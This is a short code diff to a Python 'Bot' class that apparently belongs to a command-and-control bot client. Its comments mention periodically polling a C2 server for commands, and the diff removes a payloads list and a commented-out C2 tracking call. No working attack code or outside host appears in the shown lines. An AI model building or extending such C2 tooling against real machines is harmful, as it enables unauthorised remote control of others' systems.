@@ -20,15 +20,13 @@ class Bot:
 
         # Bot info
         self.previous_command = None
-        self.payloads = []
         self.quit = False
-        # self.__track_C2()  # Start tracking C2 server for commands
         self.listener.start_command_listener()
 
 
     # Convert all elements of a tuple to lowercase, return the modified tuple
     def __to_lower_case(self, tpl: tuple):
-        return (tpl[0].lower(), tpl[1].lower() if tpl[1] else None, tpl[2].lower() if tpl[2] else None)
+        return (tpl[0].lower(), tpl[1].lower() if tpl[1] else None, tpl[2])
 
 
     # Check periodically for new commands from C2 server and execute them
